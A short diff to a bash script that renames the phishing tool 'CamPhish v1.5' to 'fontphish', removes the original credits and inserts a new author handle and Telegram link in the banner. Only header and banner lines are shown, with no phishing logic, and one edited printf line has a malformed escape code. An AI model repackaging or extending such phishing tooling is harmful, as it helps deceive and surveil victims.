@@ -1,8 +1,6 @@
 #!/bin/bash
-# CamPhish v1.5
-# Powered by TechChip
-# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
-
+# fontphish v1.5
+# developed by lisus18ikrak 
 trap 'printf "\n";stop' 2
 
 banner() {
@@ -16,7 +14,7 @@ printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | 
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
 printf " \e[1;93m CamPhish Ver 1.5 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
+printf " \e[1; lisus18ikrak | t.me/lisusikrak \e[0m \n"
 
 printf "\n"
 
